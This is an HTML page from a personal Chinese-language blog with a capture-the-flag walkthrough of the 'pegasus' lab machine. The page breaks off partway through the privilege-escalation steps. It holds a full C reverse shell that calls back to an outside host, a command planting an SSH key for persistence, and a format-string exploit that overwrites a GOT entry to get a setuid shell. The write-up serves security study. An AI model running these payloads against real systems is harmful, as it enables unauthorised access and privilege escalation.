@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>pegasus | yichen&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="">
+    <meta name="description" content="扫描端口，web 服务开在了 8088                                                                                              image.png               访问啥都没有，扫描一下目录试试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pegasus">
+<meta property="og:url" content="https://yichen115.github.io/2020/07/20/lgxkw7/index.html">
+<meta property="og:site_name" content="yichen&#39;s blog">
+<meta property="og:description" content="扫描端口，web 服务开在了 8088                                                                                              image.png               访问啥都没有，扫描一下目录试试">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595206330063-9931c990-b98b-4383-add5-9cbf8057ae8c.png#align=left&display=inline&height=451&margin=%5Bobject%20Object%5D&name=image.png&originHeight=680&originWidth=845&size=157017&status=done&style=none&width=561">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595211576711-4038fd03-634d-4ab6-adae-659042dcaad7.png#align=left&display=inline&height=335&margin=%5Bobject%20Object%5D&name=image.png&originHeight=478&originWidth=560&size=79124&status=done&style=none&width=392">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595212186672-0cc3e254-7405-4b2a-9133-e49876ebfda2.png#align=left&display=inline&height=124&margin=%5Bobject%20Object%5D&name=image.png&originHeight=213&originWidth=560&size=21516&status=done&style=stroke&width=327">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595211683436-9fa05675-3ddf-4659-8b11-79c8d5bfa726.png#align=left&display=inline&height=468&margin=%5Bobject%20Object%5D&name=image.png&originHeight=936&originWidth=1342&size=65200&status=done&style=stroke&width=671">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595212386049-ecea2721-47b7-411b-ae41-0727c544b33b.png#align=left&display=inline&height=139&margin=%5Bobject%20Object%5D&name=image.png&originHeight=277&originWidth=1365&size=25845&status=done&style=stroke&width=682.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595213247305-be334672-84bb-4ea1-9c20-d349ce1d040e.png#align=left&display=inline&height=448&margin=%5Bobject%20Object%5D&name=image.png&originHeight=646&originWidth=813&size=294769&status=done&style=none&width=564">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595213445694-8042cf4e-1ce5-477f-9002-00144ba4c420.png#align=left&display=inline&height=336&margin=%5Bobject%20Object%5D&name=image.png&originHeight=671&originWidth=1483&size=1122114&status=done&style=none&width=741.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595213592143-a2fe2676-4212-4d01-b837-1f13d3f14ba7.png#align=left&display=inline&height=244&margin=%5Bobject%20Object%5D&name=image.png&originHeight=347&originWidth=665&size=267692&status=done&style=none&width=467">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595213798347-60ebf781-a726-49f8-9b8a-72cce498e16b.png#align=left&display=inline&height=134&margin=%5Bobject%20Object%5D&name=image.png&originHeight=268&originWidth=980&size=333399&status=done&style=none&width=490">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595214336592-1887c5e8-2ebb-40cb-9a98-c017ce136c41.png#align=left&display=inline&height=434&margin=%5Bobject%20Object%5D&name=image.png&originHeight=761&originWidth=584&size=49693&status=done&style=none&width=333">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595214311779-ffe3463c-5fe1-4524-b8d4-aaa5f3b36f9f.png#align=left&display=inline&height=310&margin=%5Bobject%20Object%5D&name=image.png&originHeight=620&originWidth=790&size=43437&status=done&style=stroke&width=395">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595214550983-73f6914c-c12e-4ec9-8432-9105bf78e3dc.png#align=left&display=inline&height=394&margin=%5Bobject%20Object%5D&name=image.png&originHeight=788&originWidth=1483&size=1327059&status=done&style=none&width=741.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595214822173-96013234-a2ca-4990-9edc-045bba1485ef.png#align=left&display=inline&height=87&margin=%5Bobject%20Object%5D&name=image.png&originHeight=173&originWidth=742&size=144555&status=done&style=none&width=371">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595214860093-75b591b1-2218-4ea0-88bb-25450f6d9c51.png#align=left&display=inline&height=38&margin=%5Bobject%20Object%5D&name=image.png&originHeight=50&originWidth=675&size=44217&status=done&style=none&width=510">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595488000511-eb364dd4-412a-4e15-8638-220580a059cb.png#align=left&display=inline&height=381&margin=%5Bobject%20Object%5D&name=image.png&originHeight=762&originWidth=1118&size=1000350&status=done&style=none&width=559">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595221708264-36721677-b43c-4037-8bbd-ac422b696be9.png#align=left&display=inline&height=131&margin=%5Bobject%20Object%5D&name=image.png&originHeight=155&originWidth=397&size=55478&status=done&style=none&width=336">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595490816574-bada92e4-b066-41e9-9b11-05a34aa15a38.png#align=left&display=inline&height=98&margin=%5Bobject%20Object%5D&name=image.png&originHeight=149&originWidth=907&size=173144&status=done&style=none&width=595">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595491673735-eb46971d-24b3-4380-9b4c-da58a3622641.png#align=left&display=inline&height=163&margin=%5Bobject%20Object%5D&name=image.png&originHeight=251&originWidth=906&size=290126&status=done&style=none&width=588">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595231487392-f76080fe-b324-4b0f-a407-702850256a0c.png#align=left&display=inline&height=87&margin=%5Bobject%20Object%5D&name=image.png&originHeight=129&originWidth=929&size=25582&status=done&style=none&width=628">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595232297914-2e5e212d-aa4c-4146-9b3d-20fed1f88eb9.png#align=left&display=inline&height=474&margin=%5Bobject%20Object%5D&name=image.png&originHeight=683&originWidth=802&size=88682&status=done&style=none&width=556">
+<meta property="article:published_time" content="2020-07-20T00:52:06.000Z">
+<meta property="article:modified_time" content="2022-10-03T13:52:43.712Z">
+<meta property="article:author" content="yichen">
+<meta property="article:tag" content="网络安全 CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1595206330063-9931c990-b98b-4383-add5-9cbf8057ae8c.png#align=left&display=inline&height=451&margin=%5Bobject%20Object%5D&name=image.png&originHeight=680&originWidth=845&size=157017&status=done&style=none&width=561">
+    
+        <link rel="alternate" type="application/atom+xml" title="yichen&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.png">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">yichen</h5>
+          <a href="mailto:1097179511@qq.com" title="1097179511@qq.com" class="mail">1097179511@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-grav"></i>
+                语雀
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://passport.kanxue.com/user-center-837755.htm" target="_blank" >
+                <i class="icon icon-lg icon-snowflake-o"></i>
+                看雪
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="http://sighttp.qq.com/msgrd?v=1&uin=1097179511" target="_blank" >
+                <i class="icon icon-lg icon-qq"></i>
+                QQ
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://img2020.cnblogs.com/blog/1558534/202003/1558534-20200331231408805-256812285.jpg" target="_blank" >
+                <i class="icon icon-lg icon-wechat"></i>
+                微信
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/yichen115" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">pegasus</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">pegasus</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-07-20T00:52:06.000Z" itemprop="datePublished" class="page-time">
+  2020-07-20
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+<meta name="referrer" content="no-referrer" />
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#格式化字符串漏洞提权-john"><span class="post-toc-number">1.</span> <span class="post-toc-text">格式化字符串漏洞提权 john</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#nfs-提权-root"><span class="post-toc-number">2.</span> <span class="post-toc-text">nfs 提权 root</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-lgxkw7"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">pegasus</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-07-20 08:52:06" datetime="2020-07-20T00:52:06.000Z"  itemprop="datePublished">2020-07-20</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>扫描端口，web 服务开在了 8088</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595206330063-9931c990-b98b-4383-add5-9cbf8057ae8c.png#align=left&display=inline&height=451&margin=%5Bobject%20Object%5D&name=image.png&originHeight=680&originWidth=845&size=157017&status=done&style=none&width=561" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>访问啥都没有，扫描一下目录试试</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595211576711-4038fd03-634d-4ab6-adae-659042dcaad7.png#align=left&display=inline&height=335&margin=%5Bobject%20Object%5D&name=image.png&originHeight=478&originWidth=560&size=79124&status=done&style=none&width=392" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>/submit.php</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595212186672-0cc3e254-7405-4b2a-9133-e49876ebfda2.png#align=left&display=inline&height=124&margin=%5Bobject%20Object%5D&name=image.png&originHeight=213&originWidth=560&size=21516&status=done&style=stroke&width=327" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>/codereview.php</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595211683436-9fa05675-3ddf-4659-8b11-79c8d5bfa726.png#align=left&display=inline&height=468&margin=%5Bobject%20Object%5D&name=image.png&originHeight=936&originWidth=1342&size=65200&status=done&style=stroke&width=671" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>他是向 submit.php 发送代码的</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595212386049-ecea2721-47b7-411b-ae41-0727c544b33b.png#align=left&display=inline&height=139&margin=%5Bobject%20Object%5D&name=image.png&originHeight=277&originWidth=1365&size=25845&status=done&style=stroke&width=682.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>他说他会去执行代码，但是我只试了 php 的，wp 说是 C 语言的，找了个 C 语言的 shell<br><a href="https://www.mi1k7ea.com/2019/03/24/C%25E7%25BC%2596%25E5%2586%2599%25E5%25AE%259E%25E7%258E%25B0Linux%25E5%258F%258D%25E5%25BC%25B9shell/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/03/24/C%E7%BC%96%E5%86%99%E5%AE%9E%E7%8E%B0Linux%E5%8F%8D%E5%BC%B9shell/</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> tcp_port = <span class="number">6666</span>;</span><br><span class="line"><span class="keyword">char</span> *ip = <span class="string">"192.168.149.1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> fd;</span><br><span class="line">        <span class="keyword">if</span> ( fork() &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">                addr.sin_family = AF_INET;</span><br><span class="line">                addr.sin_port = htons(tcp_port);</span><br><span class="line">                addr.sin_addr.s_addr = inet_addr(ip);</span><br><span class="line"></span><br><span class="line">                fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span> ( <span class="built_in">connect</span>(fd, (struct sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr)) )&#123;</span><br><span class="line">                        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                dup2(fd, <span class="number">0</span>);</span><br><span class="line">                dup2(fd, <span class="number">1</span>);</span><br><span class="line">                dup2(fd, <span class="number">2</span>);</span><br><span class="line">                execve(<span class="string">"/bin/bash"</span>, <span class="number">0L</span>L, <span class="number">0L</span>L);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        reverse_shell();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>连上来了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595213247305-be334672-84bb-4ea1-9c20-d349ce1d040e.png#align=left&display=inline&height=448&margin=%5Bobject%20Object%5D&name=image.png&originHeight=646&originWidth=813&size=294769&status=done&style=none&width=564" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>把 wsl 的公钥写到 .ssh/authorized_keys 方便一点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNZ8DG1O2XEkB3Z4M03qO08QjHKCVVxfy&#x2F;6emzyKWMO+p1bf0+E+s9SzPWCTYmZ&#x2F;lfsudWe9QcNTEKRluONKMr1tC&#x2F;8bE&#x2F;ornr2pm8b&#x2F;nNZsmfKme18Qohz2JFgMk&#x2F;GLYECTWDX10fnl1a2RzSBKpUZB7CASurQLcPiP93aevHFLmDT+0jkecB9Skw7fjwTvAJLyWpDbDH0pKyd1RqtdctwYxABkxlUzh613M8ypk1++E3I8baCY4g460yUExd4aw13IeDTcBMtkBDwJaiNiT7niZD04Hz4bckt+gKwJ64FxAsGYE9GtwNbGakjKsi54EkifKsySvJdpCy3RukGu&#x2F;XURXVODODzn6luK8IXlxp5BKM5dkOkMWTnfBn3N4blaAcvVQA8TUSgF7e+OHAYwio2Y0M2qcli9vKTFV5hlsWnUohI7RLg08LzkMi5eEKxHDRy32zfcBLhLDtTuwUYmnWkgB&#x2F;NRBTx82WGm8H5n1VlvXb2Co3cz0Kr9sJHMR&#x2F;JJ8&#x3D; root@DESKTOP-SP02IB7&quot; &gt; authorized_keys</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595213445694-8042cf4e-1ce5-477f-9002-00144ba4c420.png#align=left&display=inline&height=336&margin=%5Bobject%20Object%5D&name=image.png&originHeight=671&originWidth=1483&size=1122114&status=done&style=none&width=741.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h1 id="格式化字符串漏洞提权-john"><a href="#格式化字符串漏洞提权-john" class="headerlink" title="格式化字符串漏洞提权 john"></a>格式化字符串漏洞提权 john</h1><p>my_first 权限有 s，可以 suid 提权</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595213592143-a2fe2676-4212-4d01-b837-1f13d3f14ba7.png#align=left&display=inline&height=244&margin=%5Bobject%20Object%5D&name=image.png&originHeight=347&originWidth=665&size=267692&status=done&style=none&width=467" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>用 nc 把那个文件拷贝出来</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595213798347-60ebf781-a726-49f8-9b8a-72cce498e16b.png#align=left&display=inline&height=134&margin=%5Bobject%20Object%5D&name=image.png&originHeight=268&originWidth=980&size=333399&status=done&style=none&width=490" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>IDA 打开看一下，在计算功能这里有一个格式化字符串漏洞，具体漏洞利用的知识可以去看：<a href="https://www.yuque.com/hxfqg9/bin/aedgn4" target="_blank" rel="noopener">https://www.yuque.com/hxfqg9/bin/aedgn4</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595214336592-1887c5e8-2ebb-40cb-9a98-c017ce136c41.png#align=left&display=inline&height=434&margin=%5Bobject%20Object%5D&name=image.png&originHeight=761&originWidth=584&size=49693&status=done&style=none&width=333" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595214311779-ffe3463c-5fe1-4524-b8d4-aaa5f3b36f9f.png#align=left&display=inline&height=310&margin=%5Bobject%20Object%5D&name=image.png&originHeight=620&originWidth=790&size=43437&status=done&style=stroke&width=395" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>可以数出来，AAAA 是在第八个位置被 %p 解析</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595214550983-73f6914c-c12e-4ec9-8432-9105bf78e3dc.png#align=left&display=inline&height=394&margin=%5Bobject%20Object%5D&name=image.png&originHeight=788&originWidth=1483&size=1327059&status=done&style=none&width=741.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>检查一下保护，没有 canary</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595214822173-96013234-a2ca-4990-9edc-045bba1485ef.png#align=left&display=inline&height=87&margin=%5Bobject%20Object%5D&name=image.png&originHeight=173&originWidth=742&size=144555&status=done&style=none&width=371" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>靶机上 ASRL 是开着的</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595214860093-75b591b1-2218-4ea0-88bb-25450f6d9c51.png#align=left&display=inline&height=38&margin=%5Bobject%20Object%5D&name=image.png&originHeight=50&originWidth=675&size=44217&status=done&style=none&width=510" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>可以通过 ulimit -s unlimited 使得 ASLR 实际上没用</p>
+<p>emmm，在搞个 peda<br>git clone <a href="https://github.com/longld/peda.git" target="_blank" rel="noopener">https://github.com/longld/peda.git</a> ~/peda<br>echo “source ~/peda/peda.py” &gt;&gt; ~/.gdbinit</p>
+<p>gdb 调试看一下，得到 system 的地址</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595488000511-eb364dd4-412a-4e15-8638-220580a059cb.png#align=left&display=inline&height=381&margin=%5Bobject%20Object%5D&name=image.png&originHeight=762&originWidth=1118&size=1000350&status=done&style=none&width=559" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>然后通过把 printf 的 got 的中的内容改成 system 的真实地址来拿到 shell<br>printf@got：0x8049bfc<br>system：0x40069060</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">"1\n"</span> <span class="comment"># selection #1</span></span><br><span class="line">payload += <span class="string">"1\n"</span> <span class="comment"># first number</span></span><br><span class="line">addr=<span class="number">0x8049bfc</span></span><br><span class="line">payload+= p32(addr)+p32(addr+<span class="number">2</span>)</span><br><span class="line">payload+= <span class="string">"%36952u%8$n"</span>+<span class="string">"%44966u%9$n"</span></span><br><span class="line"><span class="comment">#9060</span></span><br><span class="line"><span class="comment">#14406</span></span><br><span class="line"><span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure>
+
+<p>额，靶机没有 pwntools<br>稍改一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">"1\n"</span> <span class="comment"># selection #1</span></span><br><span class="line">payload += <span class="string">"1\n"</span> <span class="comment"># first number</span></span><br><span class="line">addr=<span class="number">0x8049bfc</span></span><br><span class="line">payload+= <span class="string">"\xfc\x9b\x04\x08"</span>+<span class="string">"\xfe\x9b\x04\x08"</span></span><br><span class="line">payload+= <span class="string">"%36952u%8$n"</span>+<span class="string">"%44966u%9$n"</span></span><br><span class="line"><span class="comment">#9060</span></span><br><span class="line"><span class="comment">#14406</span></span><br><span class="line"><span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure>
+
+<p>但实际上这样执行的是 <code>system(&quot;Selection:&quot;)</code> ，在本地写个 <code>Selection:</code> 可执行程序，由 exp.c 编译而来 <code>gcc -o &quot;Selection:&quot; exp.c</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"cp /bin/sh /tmp/john"</span>);</span><br><span class="line">    system(<span class="string">"chmod 4777 /tmp/john"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同时 <code>export PATH=$PATH:/home/mike</code> 不然那个 <code>Selection:</code> 不加 <code>./</code> 没法运行的<br>这时候 <code>python exp.py | ./my_first</code> 会在 /tmp 目录下生成 john</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595221708264-36721677-b43c-4037-8bbd-ac422b696be9.png#align=left&display=inline&height=131&margin=%5Bobject%20Object%5D&name=image.png&originHeight=155&originWidth=397&size=55478&status=done&style=none&width=336" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>当程序拥有 john 的 suid 权限，以 mike 身份运行程序的时候 euid 会变成 john，这个时候再去使用 setreuid 交换 ruid 和 euid，就可以真正的变成 john 用户</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595490816574-bada92e4-b066-41e9-9b11-05a34aa15a38.png#align=left&display=inline&height=98&margin=%5Bobject%20Object%5D&name=image.png&originHeight=149&originWidth=907&size=173144&status=done&style=none&width=595" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>去运行程序</p>
